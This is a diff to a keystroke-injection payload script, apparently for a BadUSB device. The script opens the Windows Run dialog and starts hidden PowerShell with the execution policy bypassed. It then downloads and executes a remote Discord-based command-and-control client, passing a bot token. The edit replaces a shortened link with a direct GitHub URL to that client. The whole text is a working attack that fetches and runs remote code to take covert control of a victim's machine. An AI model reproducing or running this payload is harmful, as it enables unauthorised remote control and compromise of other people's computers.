@@ -18,5 +18,5 @@ REM open powershell (remove "-W H" to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H -C $tk = 'BOT_TOKEN'; irm https://is.gd/bwdcc2 | iex
+STRING powershell -NoP -Ep Bypass -W H -C $tk = 'BOT_TOKEN'; irm https://raw.githubusercontent.com/brikodepo/PoshCord-C2/refs/heads/main/PoshCord-C2-main/Discord-C2-Client.ps1 | iex
 ENTER
